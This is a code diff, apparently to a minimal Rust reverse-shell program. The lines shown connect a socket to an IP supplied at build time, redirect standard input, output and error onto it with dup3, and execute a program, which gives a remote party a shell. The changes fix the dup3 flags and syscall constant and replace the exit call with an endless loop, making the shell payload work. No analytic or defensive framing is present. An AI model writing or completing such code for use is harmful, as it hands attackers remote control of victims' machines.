@@ -7,7 +7,7 @@ const IP: &str = core::env!("IP");
 
 #[cfg(target_arch = "x86_64")]
 mod consts {
-    pub const SYS_DUP2: usize = 33;
+    pub const SYS_DUP3: usize = 292;
     pub const SYS_SOCKET: usize = 41;
     pub const SYS_CONNECT: usize = 42;
     pub const SYS_EXECVE: usize = 59;
@@ -31,7 +31,6 @@ const IPPROTO_IP: usize = 0;
 const STDIN: usize = 0;
 const STDOUT: usize = 1;
 const STDERR: usize = 2;
-const O_CLOCK_EXEC_FLAG: isize = 4194304;
 
 #[repr(C)]
 struct sockaddr_in {
@@ -161,9 +160,9 @@ fn _start() -> ! {
             socket_addr_len as usize,
         );
 
-        sys_dup3(socket_fd, STDIN, O_CLOCK_EXEC_FLAG);
-        sys_dup3(socket_fd, STDOUT, O_CLOCK_EXEC_FLAG);
-        sys_dup3(socket_fd, STDERR, O_CLOCK_EXEC_FLAG);
+        sys_dup3(socket_fd, STDIN, 0);
+        sys_dup3(socket_fd, STDOUT, 0);
+        sys_dup3(socket_fd, STDERR, 0);
 
         syscall3(
             SYS_EXECVE,
@@ -171,7 +170,7 @@ fn _start() -> ! {
             argv.as_ptr() as usize,
             0,
         );
-        exit(0);
+        loop {}
     };
 }
 #[panic_handler]
